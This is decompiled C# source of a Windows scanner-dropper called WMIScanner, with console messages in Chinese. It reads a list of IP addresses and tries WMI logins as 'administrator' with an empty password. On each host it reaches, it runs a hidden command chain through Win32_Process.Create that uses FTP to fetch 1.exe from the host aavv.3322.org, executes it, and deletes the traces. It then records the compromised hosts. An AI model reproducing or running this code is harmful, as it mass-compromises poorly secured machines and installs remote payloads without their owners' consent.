using System;
using System.Collections;
using System.IO;
using System.Management;
using System.Threading;
using System.Windows.Forms;

namespace WMIScanner;

public class ScnClass
{
	private Thread[] threads = new Thread[500];

	private ArrayList ips = new ArrayList();

	private ArrayList rips = new ArrayList();

	public void Task()
	{
		Console.Write("读取IP地址....\r\n");
		ReadIPS();
		Console.Write("开始扫描....\r\n");
		ScannIPS();
		Console.Write("输出有效IP地址....\r\n");
		WriteIPS();
	}

	private void ReadIPS()
	{
		StreamReader streamReader = File.OpenText(Application.get_StartupPath() + "\\ips.txt");
		while (streamReader.Peek() != -1)
		{
			ips.Add(streamReader.ReadLine());
		}
		streamReader.Close();
	}

	private void WriteIPS()
	{
		string text = "";
		for (int i = 0; i < rips.Count; i++)
		{
			if (text != "")
			{
				text += "\r\n";
			}
			text += rips[i]!.ToString();
		}
		StreamWriter streamWriter = File.CreateText(Application.get_StartupPath() + "\\rips_" + DateTime.Now.Year + DateTime.Now.Month + DateTime.Now.Day + DateTime.Now.Hour + DateTime.Now.Minute + DateTime.Now.Second + ".txt");
		streamWriter.WriteLine(text);
		streamWriter.Flush();
		streamWriter.Close();
	}

	private void ScannIPS()
	{
		int num = 0;
		int num2 = 0;
		while (num2 < ips.Count)
		{
			try
			{
				int num3 = CheckTempThreadIndex();
				if (num3 >= 0)
				{
					threads[num3] = new Thread(CheckRemoteComputer);
					threads[num3].IsBackground = true;
					threads[num3].Name = num2.ToString();
					threads[num3].Start();
					num2++;
					num = 0;
				}
				else
				{
					num += 100;
					Thread.Sleep(100);
				}
			}
			catch
			{
				num = 0;
			}
		}
		bool flag = false;
		while (!flag)
		{
			flag = true;
			for (int i = 0; i < threads.Length; i++)
			{
				if (threads[i] != null)
				{
					flag = false;
					break;
				}
			}
		}
	}

	private void CheckRemoteComputer()
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_0099: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01aa: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected O, but got Unknown
		try
		{
			string text = ips[int.Parse(Thread.CurrentThread.Name!.ToString())]!.ToString();
			Console.Write("正在扫描主机：" + text + "\r\n");
			ConnectionOptions val = new ConnectionOptions();
			val.set_Username("administrator");
			val.set_Password("");
			((ManagementOptions)val).set_Timeout(new TimeSpan(10000L));
			val.set_Authority("ntlmdomain:" + text);
			ManagementPath val2 = new ManagementPath("\\\\" + text + "\\root\\cimv2:Win32_Process");
			ManagementScope val3 = new ManagementScope(val2, val);
			try
			{
				val3.Connect();
				Console.Write(text + " 有效，已扫描到有效IP：" + (rips.Count + 1) + "个，开始种植....\r\n");
				try
				{
					string text2 = "";
					text2 += "cmd /c echo open aavv.3322.org>c:\\gz";
					text2 += "&& echo brr>>c:\\gz";
					text2 += "&& echo 123>>c:\\gz";
					text2 += "&& echo binary>>c:\\gz";
					text2 += "&& echo get 1.exe c:\\aa.exe>>c:\\gz";
					text2 += "&& echo bye>>c:\\gz";
					text2 += "&& echo del c:\\run.vbs>c:\\a.bat";
					text2 += "&& echo del c:\\a.bat>>c:\\a.bat";
					text2 += "&& echo ftp -s:c:\\gz>c:\\ff.bat";
					text2 += "&& echo c:\\aa.exe>>c:\\ff.bat";
					text2 += "&& echo del c:\\gz>>c:\\ff.bat";
					text2 += "&& echo cmd /c c:\\a.bat>>c:\\ff.bat";
					text2 += "&& echo del c:\\ff.bat>>c:\\ff.bat";
					text2 += "&& echo CreateObject(\"WScript.Shell\").Run \"cmd /c c:\\ff.bat\",0 >c:\\run.vbs";
					text2 += "&& c:\\run.vbs";
					ObjectGetOptions val4 = new ObjectGetOptions();
					ManagementClass val5 = new ManagementClass(val3, val2, val4);
					ManagementBaseObject methodParameters = ((ManagementObject)val5).GetMethodParameters("Create");
					methodParameters.set_Item("CommandLine", (object)text2);
					((ManagementObject)val5).InvokeMethod("Create", methodParameters, (InvokeMethodOptions)null);
					Console.Write(text + " 植入成功，有效：" + (rips.Count + 1) + "\r\n");
				}
				catch (Exception ex)
				{
					Console.Write(text + " 植入失败：" + ex.Message.ToString());
				}
				rips.Add(text);
			}
			catch (Exception ex2)
			{
				Console.Write(text + " 连接失败：" + ex2.Message.ToString() + "\r\n");
			}
		}
		catch
		{
		}
		for (int i = 0; i < threads.Length; i++)
		{
			if (threads[i] != null && threads[i].Name!.ToLower() == Thread.CurrentThread.Name!.ToLower())
			{
				threads[i] = null;
				break;
			}
		}
		Thread.CurrentThread.Abort();
	}

	private int CheckTempThreadIndex()
	{
		int result = -1;
		for (int i = 0; i < threads.Length; i++)
		{
			if (threads[i] == null)
			{
				result = i;
				break;
			}
		}
		return result;
	}
}
